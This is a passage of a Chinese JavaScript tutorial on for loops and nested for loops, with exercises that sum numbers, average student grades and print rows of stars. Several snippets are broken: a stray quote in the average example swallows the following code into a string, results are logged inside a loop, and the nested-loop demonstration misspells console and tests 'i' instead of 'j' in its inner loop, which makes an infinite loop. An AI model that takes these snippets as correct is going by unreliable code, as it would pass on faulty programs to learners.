&lt;h4 id=&#34;案例1求-1100-之间所有整数的累加和&#34;&gt;案例1：求 1~100 之间所有整数的累加和&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;案例分析：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;需要循环100次，我们需要一个计数器！&lt;/li&gt;
&lt;li&gt;我们需要一个存储结果的变量sum，但是初始值一定是0&lt;/li&gt;
&lt;li&gt;核心算法：1 + 2 + 3 + 4 +&amp;hellip;，sum = sum + i;&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// for 驯化怒重复执行某些操作
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 求 1~100 之间的整数累加和
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 需要循环100次，我们需要一个计数器！
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// 2. 我们需要一个存储结果的变量sum，但是初始值一定是0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// 3. 核心算法：1 + 2 + 3 + 4 +...，sum = sum + i;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// 求和的变量
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#75715e&#34;&gt;// sum = sum + i;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 求 1~100 之间所有数的平均值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 需要一个 sum 和的变量，还需要一个平均值，average变量
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;average&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    for (var i = 1; i &amp;lt;= 100; i++) {
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        sum = sum + i;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    }
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    average = sum / 100;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    console.log(average);
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    // 2. 求 1~100 之间所有偶数和奇数的和
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    // 我们需要一个偶数的和变量 even 还需要一个奇数 odd
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    var even = 0;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    var odd = 0;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    for (var i = 1; i &amp;lt;= 100; i++) {
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        if (i % 2 == 0) {
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;            even = even + i;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        } else {
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;            odd = odd + i;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        }
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        console.log(&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;之间所有的偶数和是&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; + even);
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        console.log(&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;之间所有的奇数和是&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; + odd);
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    }
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    // 3. 求 1~100 之间所有能被3整除的数字的和
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    var result = 0;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    for (var i = 1; i &amp;lt;= 100; i++) {
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        if (i % 3 == 0) {
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;            result = result + i;	// result += i;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        }
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    }
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    console.log(&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;之间能够被3整除的数字和是&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;案例2求学生成绩&#34;&gt;案例2：求学生成绩&lt;/h4&gt;
&lt;p&gt;要求用户输入班级人数，之后依次输入每个学生的成绩，最后打印出该班级总的成绩以及平均成绩&lt;/p&gt;
&lt;p&gt;案例分析：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;弹出输入框输入总的班级人数（num）&lt;/li&gt;
&lt;li&gt;依次输入学生的成绩（保存起来score），&lt;strong&gt;此时我们需要用到for循环&lt;/strong&gt;，弹出的次数跟班级总人数有关系，&lt;strong&gt;条件表达式 i &amp;lt;= num&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;进行业务处理：计算成绩。先求总成绩（sum），之后求平均成绩（average）&lt;/li&gt;
&lt;li&gt;弹出结果&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请输入班级人数&amp;#39;&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// num是总的班级人数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// 求和的变量
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;average&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// 求平均值的变量
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;score&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请输入第&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;个人的成绩&amp;#39;&lt;/span&gt;);
        &lt;span style=&#34;color:#75715e&#34;&gt;// 因为从prompt取过来的数据是字符串型的需要转换为数字型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; parseFloat(&lt;span style=&#34;color:#a6e22e&#34;&gt;score&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;average&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;班级总成绩是：&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;班级平均分是：&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;average&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;案例3一行打印五个星星&#34;&gt;案例3：一行打印五个星星&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;// 一行打印五个星星
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// console.log(&amp;#39;★★★★★&amp;#39;);
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;★&amp;#39;&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#75715e&#34;&gt;// 我们采取追加字符串的方式，这样可以打印到控制台上
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;★&amp;#39;&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;);
    &lt;span style=&#34;color:#75715e&#34;&gt;// 手动输入星星个数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请输入星星的个数&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;★&amp;#39;&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;73-双重-for-循环&#34;&gt;7.3 双重 for 循环&lt;/h2&gt;
&lt;h3 id=&#34;731-双重-for-循环概述&#34;&gt;7.3.1 双重 for 循环概述&lt;/h3&gt;
&lt;p&gt;很多情况下，单层for循环并不能满足我们的需求，比如我们要打印一个5行5列的图形，打印一个倒直角三角形等，此时就可以通过循环嵌套来实现。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200509214606.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;循环嵌套&lt;/strong&gt;是指&lt;strong&gt;在一个循环语句中再定义一个循环语句的语法结构&lt;/strong&gt;，例如在for循环语句中，可以再嵌套一个for循环，这样的for循环语句我们称之为&lt;strong&gt;双重for循环&lt;/strong&gt;。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 双重for循环，语法结构
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;外层的初始化变量&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;外层的条件表达式&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;外层的操作表达式&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;里层的初始化变量&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;里层的条件表达式&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;里层的操作表达式&lt;/span&gt;) {
            &lt;span style=&#34;color:#75715e&#34;&gt;// 执行语句
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        }
    }
    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 我们可以把里面的循环看做是外层循环的语句
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 外层循环循环一次，里面的循环执行全部
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 4. 代码验证
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;cosnole&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;这是外层循环第&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;次&amp;#39;&lt;/span&gt;);
    	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;这是里层循环第&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;次&amp;#39;&lt;/span&gt;);
        }
    }
    
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;732-打印五行五颗行星&#34;&gt;7.3.2 打印五行五颗行星&lt;/h3&gt;
&lt;p&gt;核心：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;内层循环负责一行打印五个星星&lt;/li&gt;
&lt;li&gt;外层循环负责打印五行&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200509215943.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 打印五行五列星星
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {	&lt;span style=&#34;color:#75715e&#34;&gt;// 外层循环负责打印五行
